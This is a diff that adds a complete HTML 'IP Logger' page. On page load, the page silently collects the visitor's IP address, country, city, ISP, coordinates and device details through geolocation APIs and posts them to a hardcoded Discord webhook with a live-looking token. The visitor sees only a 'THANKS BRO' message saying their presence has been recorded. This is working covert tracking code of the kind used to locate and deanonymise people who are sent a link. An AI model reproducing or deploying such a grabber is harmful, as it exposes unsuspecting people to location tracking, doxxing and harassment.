@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #000000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        .container {
+            text-align: center;
+            padding: 2rem;
+        }
+
+        h1 {
+            font-size: 3rem;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 1rem;
+            font-weight: 500;
+            letter-spacing: 2px;
+        }
+
+        p {
+            color: #33ff33;
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+
+        .glitch {
+            animation: glitch 1s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { text-shadow: 0 0 5px #00ff00; }
+            50% { text-shadow: 2px 0 5px #00ff00, -2px 0 5px #00aa00; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="glitch">THANKS BRO</h1>
+        <p>✦ your presence has been recorded ✦</p>
+    </div>
+
+    <script>
+        // Discord webhook URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487560533900263614/J95q6sqcDkPqQRrgJU0a2igviRkpm5eAlJCaQuDqy0TqyJ0mT3fQLw2vydLTXRaHziv-';
+        
+        // Flag to track if notification has been sent (only once per session)
+        let notificationSent = false;
+
+        // Function to get detailed visitor info (IP, country, ISP)
+        async function getVisitorInfo() {
+            try {
+                // Use ipapi.co for detailed geolocation and ISP data (free tier)
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                return {
+                    ip: data.ip || 'Unknown',
+                    country: data.country_name || data.country || 'Unknown',
+                    countryCode: data.country_code || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    isp: data.org || data.asn || 'Unknown',
+                    latitude: data.latitude,
+                    longitude: data.longitude
+                };
+            } catch (error) {
+                console.error('Error fetching from ipapi.co:', error);
+                
+                // Fallback to ip-api.com
+                try {
+                    const fallbackResponse = await fetch('http://ip-api.com/json/');
+                    const fallbackData = await fallbackResponse.json();
+                    
+                    if (fallbackData.status === 'success') {
+                        return {
+                            ip: fallbackData.query || 'Unknown',
+                            country: fallbackData.country || 'Unknown',
+                            countryCode: fallbackData.countryCode || 'Unknown',
+                            city: fallbackData.city || 'Unknown',
+                            region: fallbackData.regionName || 'Unknown',
+                            isp: fallbackData.isp || fallbackData.org || 'Unknown',
+                            latitude: fallbackData.lat,
+                            longitude: fallbackData.lon
+                        };
+                    }
+                } catch (fallbackError) {
+                    console.error('Error fetching from ip-api.com:', fallbackError);
+                }
+                
+                // Ultimate fallback: just get IP
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    return {
+                        ip: ipData.ip,
+                        country: 'Unknown',
+                        isp: 'Unknown'
+                    };
+                } catch (ipError) {
+                    return {
+                        ip: 'Unable to fetch',
+                        country: 'Unknown',
+                        isp: 'Unknown'
+                    };
+                }
+            }
+        }
+
+        // Function to get current time in readable format
+        function getCurrentTime() {
+            const now = new Date();
+            return now.toLocaleString('en-US', { 
+                year: 'numeric', 
+                month: '2-digit', 
+                day: '2-digit', 
+                hour: '2-digit', 
+                minute: '2-digit', 
+                second: '2-digit',
+                hour12: true,
+                timeZoneName: 'short'
+            });
+        }
+
+        // Function to get user agent info
+        function getUserAgentInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Unknown';
+            let os = 'Unknown';
+            let browser = 'Unknown';
+            
+            if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac')) os = 'Mac';
+            else if (ua.includes('Linux')) os = 'Linux';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+            
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+            else if (ua.includes('Edg')) browser = 'Edge';
+            
+            if (ua.includes('Mobile')) device = 'Mobile';
+            else device = 'Desktop';
+            
+            return `${browser} on ${os} (${device})`;
+        }
+
+        // Function to send Discord webhook
+        async function sendDiscordNotification(fields) {
+            const embed = {
+                title: '👁️ New Visitor',
+                color: 0x00ff00,
+                fields: fields,
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: 'IP Logger'
+                }
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+
+                if (!response.ok) {
+                    console.error('Failed to send Discord webhook:', response.status);
+                } else {
+                    console.log('Discord notification sent successfully');
+                }
+            } catch (error) {
+                console.error('Error sending Discord webhook:', error);
+            }
+        }
+
+        // Main function to log visitor
+        async function logVisitor() {
+            if (notificationSent) return;
+            
+            const visitorInfo = await getVisitorInfo();
+            const time = getCurrentTime();
+            const userAgent = getUserAgentInfo();
+            
+            const fields = [
+                { name: '🌐 IP Address', value: visitorInfo.ip, inline: true },
+                { name: '📍 Country', value: visitorInfo.country, inline: true },
+                { name: '🏢 ISP / Provider', value: visitorInfo.isp, inline: true },
+                { name: '🏙️ City', value: visitorInfo.city || 'Unknown', inline: true },
+                { name: '🖥️ Device', value: userAgent, inline: true },
+                { name: '⏰ Time', value: time, inline: false }
+            ];
+            
+            await sendDiscordNotification(fields);
+            notificationSent = true;
+        }
+
+        // Run when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            // Send notification after a short delay
+            setTimeout(() => {
+                logVisitor();
+            }, 500);
+        });
+    </script>
+</body>
+</html>
